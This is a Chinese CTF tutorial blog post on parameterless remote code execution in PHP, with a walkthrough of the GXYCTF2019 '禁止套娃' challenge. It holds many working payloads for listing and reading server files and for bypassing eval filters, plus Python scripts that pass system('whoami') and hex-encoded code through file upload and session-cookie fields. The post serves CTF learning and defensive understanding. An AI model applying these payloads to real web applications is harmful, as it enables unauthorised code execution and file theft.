  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
    <link itemprop="mainEntityOfPage" href="http://example.com/2025/04/14/%E6%97%A0%E5%8F%82%E6%95%B0rce/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="Cnext">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="路漫漫其修远兮 吾将上下而求索">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2025/04/14/%E6%97%A0%E5%8F%82%E6%95%B0rce/" class="post-title-link" itemprop="url">无参数rce</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">发表于</span>

              <time title="创建时间：2025-04-14 23:07:54" itemprop="dateCreated datePublished" datetime="2025-04-14T23:07:54+08:00">2025-04-14</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="far fa-calendar-check"></i>
                </span>
                <span class="post-meta-item-text">更新于</span>
                <time title="修改时间：2025-04-15 22:01:29" itemprop="dateModified" datetime="2025-04-15T22:01:29+08:00">2025-04-15</time>
              </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-folder"></i>
              </span>
              <span class="post-meta-item-text">分类于</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/web/" itemprop="url" rel="index"><span itemprop="name">web</span></a>
                </span>
            </span>

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <h1 id="无参数rce"><a href="#无参数rce" class="headerlink" title="无参数rce"></a>无参数rce</h1><p>这是今天打tgctf2025题的时候，遇到的问题，秉持着遇到问题就解决的思想，写下这篇博客，系统的研究无参数rce，废话不多说</p>
<h2 id="什么是无参数"><a href="#什么是无参数" class="headerlink" title="什么是无参数"></a>什么是无参数</h2><p>就是使用函数的时候不能带有参数，具体来说就是各种函数的嵌套，利用各种函数的返回值</p>
<h2 id="常见函数"><a href="#常见函数" class="headerlink" title="常见函数"></a>常见函数</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">目录操作：</span><br><span class="line">getchwd() ：函数返回当前工作目录。</span><br><span class="line">scandir() ：函数返回指定目录中的文件和目录的数组。</span><br><span class="line">dirname() ：函数返回路径中的目录部分。</span><br><span class="line">chdir() ：函数改变当前的目录。</span><br><span class="line"></span><br><span class="line">数组相关的操作：</span><br><span class="line">end() - 将内部指针指向数组中的最后一个元素，并输出。</span><br><span class="line">next() - 将内部指针指向数组中的下一个元素，并输出。</span><br><span class="line">prev() - 将内部指针指向数组中的上一个元素，并输出。</span><br><span class="line">reset() - 将内部指针指向数组中的第一个元素，并输出。</span><br><span class="line">each() - 返回当前元素的键名和键值，并将内部指针向前移动。</span><br><span class="line">array_shift() - 删除数组中第一个元素，并返回被删除元素的值。</span><br><span class="line"></span><br><span class="line">读文件</span><br><span class="line">show_source() - 对文件进行语法高亮显示。</span><br><span class="line">readfile() - 输出一个文件。</span><br><span class="line">highlight_file() - 对文件进行语法高亮显示。</span><br><span class="line">file_get_contents() - 把整个文件读入一个字符串中。</span><br><span class="line">readgzfile() - 可用于读取非 gzip 格式的文件</span><br></pre></td></tr></table></figure>

<h3 id="getallheaders"><a href="#getallheaders" class="headerlink" title="getallheaders()"></a>getallheaders()</h3><p>这个函数的作用是获取<code>http</code>所有的头部信息，也就是<code>headers</code>，然后我们可以用<code>var_dump</code>把它打印出来，但这个有个限制条件就是必须在<code>apache</code>的环境下可以使用，其它环境都是用不了的</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">plaintext</span><br><span class="line">?code=print_r(getallheaders()); </span><br></pre></td></tr></table></figure>

<p>数组会返回 HTTP 请求头。</p>
<h3 id="get-defined-vars"><a href="#get-defined-vars" class="headerlink" title="get_defined_vars()"></a>get_defined_vars()</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">getallheaders()`是有局限性的，因为如果中间件不是`apache`的话，它就用不了了，那我们就介绍一种更为普遍的方法`get_defined_vars()`，这种方法其实和上面那种方法原理是差不多的，它并不是获取的`headers`，而是获取的四个全局变量`$_GET $_POST $_FILES $_COOKIE</span><br><span class="line">plaintext</span><br><span class="line">?code=var_dump(get_defined_vars()); </span><br></pre></td></tr></table></figure>

<p><code>var_dump</code>可以把返回数组打印出来。</p>
<h3 id="getenv"><a href="#getenv" class="headerlink" title="getenv()"></a>getenv()</h3><p>获取环境变量的值(在PHP7.1之后可以不给予参数)<br>适用于：php7以上的版本</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">plaintext</span><br><span class="line">?code=var_dump(getenv());</span><br></pre></td></tr></table></figure>

<p>php7.0以下返回<code>bool(false)</code></p>
<p>php7.0以上正常回显。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">plaintext</span><br><span class="line">?code=var_dump(getenv(phpinfo()));</span><br></pre></td></tr></table></figure>

<p>phpinfo()可以获取所有环境变量。</p>
<h3 id="scandir"><a href="#scandir" class="headerlink" title="scandir()"></a>scandir()</h3><p>文件读取</p>
<h4 id="查看当前目录文件名"><a href="#查看当前目录文件名" class="headerlink" title="查看当前目录文件名"></a>查看当前目录文件名</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">plaintext</span><br><span class="line">print_r(scandir(current(localeconv())));</span><br></pre></td></tr></table></figure>

<h4 id="读取当前目录文件"><a href="#读取当前目录文件" class="headerlink" title="读取当前目录文件"></a>读取当前目录文件</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">plaintext</span><br><span class="line">当前目录倒数第一位文件：</span><br><span class="line">show_source(end(scandir(getcwd())));</span><br><span class="line">show_source(current(array_reverse(scandir(getcwd()))));</span><br><span class="line"></span><br><span class="line">当前目录倒数第二位文件：</span><br><span class="line">show_source(next(array_reverse(scandir(getcwd()))));</span><br><span class="line"></span><br><span class="line">随机返回当前目录文件：</span><br><span class="line">highlight_file(array_rand(array_flip(scandir(getcwd()))));</span><br><span class="line">show_source(array_rand(array_flip(scandir(getcwd()))));</span><br><span class="line">show_source(array_rand(array_flip(scandir(current(localeconv())))));</span><br></pre></td></tr></table></figure>

<h4 id="查看上一级目录文件名"><a href="#查看上一级目录文件名" class="headerlink" title="查看上一级目录文件名"></a>查看上一级目录文件名</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">plaintext</span><br><span class="line">print_r(scandir(dirname(getcwd())));</span><br><span class="line">print_r(scandir(next(scandir(getcwd()))));</span><br><span class="line">print_r(scandir(next(scandir(getcwd()))));</span><br></pre></td></tr></table></figure>

<h4 id="读取上级目录文件"><a href="#读取上级目录文件" class="headerlink" title="读取上级目录文件"></a>读取上级目录文件</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">plaintext</span><br><span class="line">show_source(array_rand(array_flip(scandir(dirname(chdir(dirname(getcwd())))))));</span><br><span class="line">show_source(array_rand(array_flip(scandir(chr(ord(hebrevc(crypt(chdir(next(scandir(getcwd())))))))))));</span><br><span class="line">show_source(array_rand(array_flip(scandir(chr(ord(hebrevc(crypt(chdir(next(scandir(chr(ord(hebrevc(crypt(phpversion())))))))))))))));</span><br></pre></td></tr></table></figure>

<p>payload解释：<br>● array_flip()：交换数组中的键和值，成功时返回交换后的数组，如果失败返回 NULL。<br>● array_rand()：从数组中随机取出一个或多个单元，如果只取出一个(默认为1)，array_rand() 返回随机单元的键名。 否则就返回包含随机键名的数组。 完成后，就可以根据随机的键获取数组的随机值。<br>● array_flip()和array_rand()配合使用可随机返回当前目录下的文件名<br>● dirname(chdir(dirname()))配合切换文件路径</p>
<h2 id="无参数读取文件"><a href="#无参数读取文件" class="headerlink" title="无参数读取文件"></a>无参数读取文件</h2><p><strong>查看当前目录</strong></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">print_r(getcwd());</span><br></pre></td></tr></table></figure>

<p><code>print_r(scandir(&#39;.&#39;))</code>查看当前目录下所有文件，以数组的形式输出。</p>
<p>但是要怎么构造.呢</p>
<p>使用localeconv()</p>
<p>localeconv() 函数返回一包含本地数字及货币格式信息的数组。而数组第一项就是 <code>.</code></p>
<ul>
<li><p>current() 返回数组中的单元，默认第一个值。</p>
<p>所以我们输出 <code>print_r(scandir(current(localeconv())));</code>也会如同 <code>print_r(scandir(&#39;.&#39;))</code>打印当前目录下文件名。</p>
</li>
<li><p>使用 <code>print_r(scandir(pos(localeconv())));</code>，pos是current的别名</p>
</li>
<li><p><code>reset()</code>函数将内部指针指向数组中的第一个元素，并输出。</p>
<blockquote>
<p>相关的方法：</p>
<ul>
<li><a target="_blank" rel="noopener" href="https://www.w3school.com.cn/php/func_array_current.asp">current()</a>- 返回数组中的当前元素的值</li>
<li><a target="_blank" rel="noopener" href="https://www.w3school.com.cn/php/func_array_end.asp">end()</a>- 将内部指针指向数组中的最后一个元素，并输出</li>
<li><a target="_blank" rel="noopener" href="https://www.w3school.com.cn/php/func_array_next.asp">next()</a>- 将内部指针指向数组中的下一个元素，并输出</li>
<li><a target="_blank" rel="noopener" href="https://www.w3school.com.cn/php/func_array_prev.asp">prev()</a>- 将内部指针指向数组中的上一个元素，并输出</li>
<li><a target="_blank" rel="noopener" href="https://www.w3school.com.cn/php/func_array_each.asp">each()</a>- 返回当前元素的键名和键值，并将内部指针向前移动</li>
</ul>
</blockquote>
</li>
</ul>
<h3 id="查看和读取根目录文件"><a href="#查看和读取根目录文件" class="headerlink" title="查看和读取根目录文件"></a>查看和读取根目录文件</h3><p>所获得的字符串第一位有几率是&#x2F;，需要多试几次</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">php</span><br><span class="line">print_r(scandir(chr(ord(strrev(crypt(serialize(array())))))));</span><br></pre></td></tr></table></figure>

<h4 id="current-和pos"><a href="#current-和pos" class="headerlink" title="current()和pos()"></a>current()和pos()</h4><p><code>pos()</code>函数是<code>current()</code>函数的别名，两者是完全一样的，</p>
<p>它的作用就是输出数组中当前元素的值，只输出值而忽略掉键，默认是数组中的第一个值。</p>
<h4 id="chdir"><a href="#chdir" class="headerlink" title="chdir()"></a>chdir()</h4><p>这个函数是用来跳目录的，有时想读的文件不在当前目录下就用这个来切换，因为<code>scandir()</code>会将这个目录下的文件和目录都列出来，那么利用操作数组的函数将内部指针移到我们想要的目录上然后直接用<code>chdir</code>切就好了，如果要向上跳就要构造<code>chdir(&#39;..&#39;)</code></p>
<h4 id="array-reverse"><a href="#array-reverse" class="headerlink" title="array_reverse()"></a>array_reverse()</h4><p>将整个数组倒过来，有的时候当我们想读的文件比较靠后时，就可以用这个函数把它倒过来，就可以少用几个<code>next()</code></p>
<h4 id="highlight-file"><a href="#highlight-file" class="headerlink" title="highlight_file()"></a>highlight_file()</h4><p>打印输出或者返回 filename 文件中语法高亮版本的代码，相当于就是用来读取文件的</p>
<p><strong>查看上级目录</strong>方法一：<strong>dirname()</strong></p>
<p>从图中可以看出，如果传入的值是绝对路径（不包含文件名），则返回的是上一层路径，传入的是文件名绝对路径则返回文件的当前路径</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?code=print_r(scandir(dirname(getcwd())));</span><br></pre></td></tr></table></figure>

<p><strong>方法二：构造”..”</strong></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">print_r(scandir(next(scandir(getcwd()))));//也可查看上级目录文件</span><br><span class="line">next(scandir(chr(ord(hebrevc(crypt(time()))))))</span><br></pre></td></tr></table></figure>

<p>chdir() ：改变当前工作目录</p>
<p>直接print_r(readfile(array_rand(array_flip(scandir(dirname(getcwd()))))));是不可以的，会报错，因为默认是在当前工作目录寻找并读取这个文件，而这个文件在上一层目录，所以要先改变当前工作目录</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">show_source(array_rand(array_flip(scandir(dirname(chdir(dirname(getcwd())))))));</span><br></pre></td></tr></table></figure>

<p><strong>读取目录的函数</strong></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">show_source()</span><br><span class="line">highlight_file()</span><br><span class="line">file_get_contents ()</span><br><span class="line">readfile()</span><br><span class="line">readgzfile()</span><br></pre></td></tr></table></figure>

<p><strong>无参数命令执行(RCE)</strong></p>
<p>用其他变量辅佐eval传入参数</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">$_POST</span><br><span class="line">$_GET</span><br><span class="line">$_FILES</span><br><span class="line">$_ENV</span><br><span class="line">$_COOKIE</span><br><span class="line">$_SESSION</span><br></pre></td></tr></table></figure>

<p><strong>getallheaders()</strong></p>
<p>getallheaders()获取全部 HTTP 请求头信息</p>
<p>apache_response_headers() 获得全部 HTTP 响应头信息</p>
<p>这就意味着我们在headers里传入参数，再用该函数进行接收即可，但是其局限性在于只能是apeach 环境下。</p>
<p><strong>get_defined_vars()</strong></p>
<p>它能获取到以下变量</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">$_GET</span><br><span class="line">$_POST</span><br><span class="line">$_FILES</span><br><span class="line">$_COOKIE</span><br></pre></td></tr></table></figure>

<p>如何利用file变量进行rce呢？</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line"></span><br><span class="line">files = &#123;</span><br><span class="line">  &quot;system(&#x27;whoami&#x27;);&quot;: &quot;&quot;</span><br><span class="line">&#125;</span><br><span class="line">#data = &#123;</span><br><span class="line">#&quot;code&quot;:&quot;eval(pos(pos(end(get_defined_vars()))));&quot;</span><br><span class="line">#&#125;</span><br><span class="line">r = requests.post(&#x27;http://127.0.0.1/333/222/111/index.php?code=eval(pos(pos(end(get_defined_vars()))));&#x27;, files=files)</span><br><span class="line">print(r.content.decode(&quot;utf-8&quot;, &quot;ignore&quot;))</span><br></pre></td></tr></table></figure>

<p><strong>session_id()</strong></p>
<p>session_id()： 可以用来获取&#x2F;设置 当前会话 ID。</p>
<p>session需要使用session_start()开启，然后返回参数给session_id()</p>
<p>但是有一点限制：文件会话管理器仅允许会话 ID 中使用以下字符：a-z A-Z 0-9 ,（逗号）和 - 减号）</p>
<p>但是hex2bin()函数可以将十六进制转换为ASCII 字符，所以我们传入十六进制并使用hex2bin()即可</p>
<p>（PHP5.5 -7.1.9可行）</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?code=show_source(session_id(session_start()));</span><br></pre></td></tr></table></figure>

<p>其他版本可考虑用<code>hex2bin()</code> 将十六进制形式的命令还原。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line">url = &#x27;http://localhost/?code=eval(hex2bin(session_id(session_start())));&#x27;</span><br><span class="line">payload = &quot;phpinfo();&quot;.encode(&#x27;hex&#x27;)</span><br><span class="line">cookies = &#123;</span><br><span class="line">    &#x27;PHPSESSID&#x27;:payload</span><br><span class="line">&#125;</span><br><span class="line">r = requests.get(url=url,cookies=cookies)</span><br><span class="line">print r.content</span><br></pre></td></tr></table></figure>

<p><strong>getenv()</strong></p>
<p>getenv() 获取一个环境变量的值（只适用于7.1以后版本）</p>
<p>通过array_rand()和array_flip()结合去取我们想要的那个值，但是一般情况下php.ini中，variables_order值为：GPCS，即没有定义Environment(E)变量，无法利用。只有当其配置为EGPCS时才可利用。</p>
<p><strong>那么如何读取其他文件</strong></p>
<ul>
<li>array_flip() 函数用于反转&#x2F;交换数组中的键名和对应关联的键值。</li>
<li>array_rand() 函数返回数组中的随机键名，或者如果您规定函数返回不只一个键名，则返回包含随机键名的数组。</li>
</ul>
<p>我们可以使用array_rand(array_flip())，array_flip()是交换数组的键和值，array_rand()是随机返回一个数组。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">readfile(array_rand(array_flip(scandir(getcwd()))));</span><br><span class="line">readfile(array_rand(array_flip(scandir(current(localeconve())))));</span><br></pre></td></tr></table></figure>

<p><strong>如果目标文件不在当前目录呢？</strong></p>
<ul>
<li><p>dirname() ：返回路径中的目录部分，</p>
<p>从图中可以看出，如果传入的值是绝对路径（不包含文件名），则返回的是上一层路径，传入的是文件名绝对路径则返回文件的当前路径</p>
</li>
<li><p>chdir() ：改变当前工作目录</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">print_r(scandir(dirname(getcwd()))); //查看上一级目录的文件</span><br></pre></td></tr></table></figure>
</li>
<li><p>构造”..”</p>
<p>print_r(next(scandir(getcwd())));：我们scandir(getcwd())出现的数组第二个就是”..”，所以可以用next()获取</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">print_r(scandir(next(scandir(getcwd()))));//也可查看上级目录文件</span><br></pre></td></tr></table></figure>

<p>结合上文的一些构造都是可以获得”..”的 ：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">next(scandir(chr(ord(hebrevc(crypt(time()))))))</span><br></pre></td></tr></table></figure>
</li>
<li><p>读取上级目录文件</p>
<p>直接 <code>print_r(readfile(array_rand(array_flip(scandir(dirname(getcwd()))))));</code>是不可以的，会报错，因为默认是在当前工作目录寻找并读取这个文件，而这个文件在上一层目录，所以要先改变当前工作目录,前面写到了chdir()，使用：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">show_source(array_rand(array_flip(scandir(dirname(chdir(dirname(getcwd())))))));</span><br></pre></td></tr></table></figure>

<p>如果不能使用dirname()，可以使用构造”..”的方式切换路径并读取：</p>
<p>但是这里切换路径后getcwd()和localeconv()不能接收参数，因为语法不允许，我们可以用之前的hebrevc(crypt(arg))</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">show_source(array_rand(array_flip(scandir(chr(ord(hebrevc(crypt(chdir(next(scandir(getcwd())))))))))));</span><br><span class="line">或更复杂的：</span><br><span class="line">show_source(array_rand(array_flip(scandir(chr(ord(hebrevc(crypt(chdir(next(scandir(chr(ord(hebrevc(crypt(phpversion())))))))))))))));</span><br><span class="line">还可以用：</span><br><span class="line">show_source(array_rand(array_flip(scandir(chr(current(localtime(time(chdir(next(scandir(current(localeconv()))))))))))));//这个得爆破，不然手动要刷新很久，如果文件是正数或倒数第一个第二个最好不过了，直接定位</span><br></pre></td></tr></table></figure>

<p>还有：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">if(chdir(next(scandir(getcwd()))))show_source(array_rand(array_flip(scandir(getcwd()))));</span><br></pre></td></tr></table></figure></li>
</ul>
<h2 id="三、实战例题-GXYCTF2019-禁止套娃"><a href="#三、实战例题-GXYCTF2019-禁止套娃" class="headerlink" title="三、实战例题-[GXYCTF2019]禁止套娃"></a>三、实战例题-[GXYCTF2019]禁止套娃</h2><p>这道题目打开就是一个普通的页面，经过目录扫描会发现是git源码泄露，用<code>Githack</code>把源码弄出来：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">php</span><br><span class="line">&lt;?php</span><br><span class="line">include &quot;flag.php&quot;;</span><br><span class="line">echo &quot;flag在哪里呢？&lt;br&gt;&quot;;</span><br><span class="line">if(isset($_GET[&#x27;exp&#x27;]))&#123;</span><br><span class="line">    if (!preg_match(&#x27;/data:\/\/|filter:\/\/|php:\/\/|phar:\/\//i&#x27;, $_GET[&#x27;exp&#x27;])) &#123;</span><br><span class="line">        if(&#x27;;&#x27; === preg_replace(&#x27;/[a-z,_]+\((?R)?\)/&#x27;, NULL, $_GET[&#x27;exp&#x27;])) &#123;</span><br><span class="line">            if (!preg_match(&#x27;/et|na|info|dec|bin|hex|oct|pi|log/i&#x27;, $_GET[&#x27;exp&#x27;])) &#123;</span><br><span class="line">                // echo $_GET[&#x27;exp&#x27;];</span><br><span class="line">                @eval($_GET[&#x27;exp&#x27;]);</span><br><span class="line">            &#125;</span><br><span class="line">            else&#123;</span><br><span class="line">                die(&quot;还差一点哦！&quot;);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        else&#123;</span><br><span class="line">            die(&quot;再好好想想！&quot;);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    else&#123;</span><br><span class="line">        die(&quot;还想读flag，臭弟弟！&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">// highlight_file(__FILE__);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<h3 id="代码分析"><a href="#代码分析" class="headerlink" title="代码分析"></a>代码分析</h3><p><strong>首先看第一行关键代码：</strong></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">plaintext</span><br><span class="line">!preg_match(&#x27;/data:\/\/|filter:\/\/|php:\/\/|phar:\/\//i&#x27;, $_GET[&#x27;exp&#x27;])</span><br></pre></td></tr></table></figure>

<p>很明显，大概意思就是不让我们用伪协议去写或者是读文件。</p>
<p><strong>然后看第二行关键代码：</strong></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">plaintext</span><br><span class="line">&#x27;;&#x27; === preg_replace(&#x27;/[a-z,_]+\((?R)?\)/&#x27;, NULL, $_GET[&#x27;exp&#x27;])</span><br></pre></td></tr></table></figure>

<p>再看第二个正则,中间有一个(?R)，这个式子他会递归调用当前的正则表达式，就是说会出现\w+((?R)?)，\w+(\w+((?R)?))的情况，也就是无参数函数校验。</p>
<p><strong>最后第三行关键代码：</strong></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">plaintext</span><br><span class="line">!preg_match(&#x27;/et|na|info|dec|bin|hex|oct|pi|log/i&#x27;, $_GET[&#x27;exp&#x27;])</span><br></pre></td></tr></table></figure>

<p>就是屏蔽了一些函数名的关键字之类的东西。</p>
<p><strong>分析完成我们整理一下：不能用伪协议 、只能用无参数函数形式、注意函数过滤</strong></p>
<h3 id="解题步骤"><a href="#解题步骤" class="headerlink" title="解题步骤"></a>解题步骤</h3><h4 id="首先遍历当前目录："><a href="#首先遍历当前目录：" class="headerlink" title="首先遍历当前目录："></a>首先遍历当前目录：</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">plaintext</span><br><span class="line">?exp=print_r(scandir(current(localeconv())));</span><br></pre></td></tr></table></figure>

<p>顺利得到目录。</p>
<h4 id="方法一："><a href="#方法一：" class="headerlink" title="方法一："></a>方法一：</h4><p>可以看到<code>flag.php</code>是倒数第二个，那我们把它反转一下，然后再用一个<code>next()</code>就是<code>flag.php</code>这个文件了：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">plaintext</span><br><span class="line">?exp=print_r(next(array_reverse(scandir(current(localeconv())))));</span><br></pre></td></tr></table></figure>

<p>已经很接近答案了，用<code>highlight_file</code>读取这个文件就拿到flag了：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">plaintext</span><br><span class="line">?exp=highlight_file(next(array_reverse(scandir(current(localeconv())))));</span><br></pre></td></tr></table></figure>

<p><strong>思路总结</strong></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">plaintext</span><br><span class="line">scandir(current(localeconv()))是查看当前目录</span><br><span class="line">加上array_reverse()是将数组反转，即Array([0]=&gt;index.php[1]=&gt;flag.php=&gt;[2].git[3]=&gt;..[4]=&gt;.)</span><br><span class="line">再加上next()表示内部指针指向数组的下一个元素，并输出，即指向flag.php</span><br><span class="line">highlight_file()打印输出或者返回 filename 文件中语法高亮版本的代码</span><br></pre></td></tr></table></figure>

<h4 id="方法二："><a href="#方法二：" class="headerlink" title="方法二："></a>方法二：</h4><p>我们已经知道了flag就在当前目录下了。<br><code>array_rand()</code>函数可以随机读取一个数组键，<code>array_flip()</code>又可以将数组中的键和值进行对换。<br>用这两个函数就可以实现对flag.php的读取。最后payload如下：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">plaintext</span><br><span class="line">?exp=print_r(show_source(array_rand(array_flip(scandir(current(localeconv()))))));</span><br></pre></td></tr></table></figure>

<p>因为<code>array_rand()</code>的选取是随机的，所以不一定会直接出来，多刷新几次就可以了</p>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
    <link itemprop="mainEntityOfPage" href="http://example.com/2025/04/14/%E6%B7%B1%E5%BA%A6%E5%AD%A6%E4%B9%A0-2day/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="Cnext">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="路漫漫其修远兮 吾将上下而求索">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2025/04/14/%E6%B7%B1%E5%BA%A6%E5%AD%A6%E4%B9%A0-2day/" class="post-title-link" itemprop="url">深度学习-2day</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">发表于</span>

              <time title="创建时间：2025-04-14 23:06:56" itemprop="dateCreated datePublished" datetime="2025-04-14T23:06:56+08:00">2025-04-14</time>
